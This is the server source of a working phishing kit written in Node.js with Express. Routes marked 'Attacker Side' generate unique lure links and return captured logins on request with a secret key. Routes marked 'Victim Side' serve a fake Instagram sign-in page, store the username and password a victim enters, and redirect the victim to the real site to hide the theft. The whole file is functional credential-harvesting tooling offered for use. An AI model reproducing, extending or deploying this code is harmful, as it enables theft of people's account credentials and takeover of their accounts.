const express = require('express');
const dotenv = require('dotenv');
const path = require('path');

const initDB = require('./db');
const util = require('./util');

dotenv.config();
const port = process.env.PORT || 8000;

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }))
app.use(express.static('public'));

app.set("view engine", "ejs");

app.get('/', (_req, res) => {
  res.send('');
});

// Attacker Side
// ================================================================================

// To generate a new link, send a POST request at '/generate' with
// the 'site' field specified in the POST body.
// 'site'  will be the name of the website for which link is to be generated.
//
// For example: { 'site': 'instagram' }
//
app.post('/generate', async (req, res) => {
  try {
    if (!req.body.site) {
      res.status(401).json({
	error: 'site not provided!'
      });
      return;
    }
    const url = await util.genUniqueURL(collection);
    const key = util.randomString(16);
    const data = {
      'site': req.body.site,
      'url': url,
      'key': key,
    };
    await collection.insertOne(data);
    res.status(200).json(data);
  } catch (error) {
    console.error(error);
    res.status(500).json({
      error: 'Internal Server Error'
    });
  }
});

// To extract the credentials from a previously created link, send a POST
// request at '/extract' with the 'url' and 'key' fields specified in the POST
// body.
// 'url'  is NOT the complete URL but the part without domain name and '/'.
// Exactly the way '/generate' returned.
// 'key' is the secret key returned by '/generate'.
//
// Note: new sign-in on the same link will overwrite the previous credentials.
// This behaviour may change in the future versions.
//
app.post('/extract', async (req, res) => {
  try {
    const { url, key } = req.body;
    if (url && key) {
      const result = await collection.findOne({ url, key });
      if (result == null)
	res.status(404).json({ error: 'no records found!' });
      else
	res.status(200).json(result);
    } else {
      res.status(400).json({
	error: 'bad request, please check the POST body'
      });
    }
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'internal server error'});
  }
});

// Victim Side
// ================================================================================

// When a GET request at a route with the below mentioned regex is
// received, check the database for a record associated with that url.
// Then based on the 'site' field of the query result send appropriate
// response.
// The POST url of the sign-in form is set to the same url.
//
app.get(new RegExp('/[a-zA-Z0-9]{5,}'), async (req, res) => {
  const url = req.url.substring(1);
  const result = await collection.findOne({ url });
  if (result == null) res.status(404).send('Page not found!');
  else {
    if (result.site === 'instagram') {
      res.render('instagram.ejs', { 'url': url });
    } else {
      res.status(404).send('Page not found!');
    }
  }
});

// When the user tries to sign-in, update the database record with
// the entered credentials.
//
app.post(new RegExp('/[a-zA-Z0-9]{5,}'), async (req, res) => {
  try {
    const url = req.url.substring(1);
    const result = await collection.findOne({ url });
    // If there is no record, then there is nothing to update.
    if (!result) res.status(400).send('bad request');
    else {
      await collection.updateOne({ url }, {
	$set: {
	  username: req.body.username,
	  password: req.body.password,
	}
      });
      if (result.site === 'instagram')
	res.redirect('https://instagram.com');
      else
	// TODO: find a good redirection.
	res.redirect('https://instagram.com');
    }
  } catch (err) {
    console.error(err);
    res.status(500).send('some error occured');
  }
});


let collection;
async function main() {
  const dbData = {
    dbURI: process.env.DB_URI,
    dbName: process.env.DB_NAME,
    collectionName: process.env.COLLECTION_NAME
  };
  collection = await initDB(dbData);
  if (collection) console.error('[OK] connected to database');
  app.listen(port, () => {
    console.log(`[OK] server is listening at port: ${port}`);
  });
}

main();
